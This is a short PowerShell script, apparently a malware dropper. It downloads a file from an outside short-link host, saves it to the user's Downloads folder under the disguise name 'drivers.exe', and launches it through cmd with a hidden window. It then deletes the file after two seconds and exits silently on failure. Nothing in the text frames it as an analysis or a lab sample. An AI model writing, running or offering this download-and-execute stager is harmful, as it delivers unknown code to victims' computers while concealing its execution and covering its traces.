$url = "https://dkm.s.gy/file"
$out = "$env:USERPROFILE\Downloads\drivers.exe"

try {
    Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing
    if (Test-Path $out) {
        # Use cmd /c start to detach the process so PowerShell can close
        Start-Process "cmd.exe" -ArgumentList "/c start `"$out`"" -WindowStyle Hidden
        Start-Sleep -Seconds 2
        Remove-Item $out -Force -ErrorAction SilentlyContinue
    }
} catch {
    exit 1
}
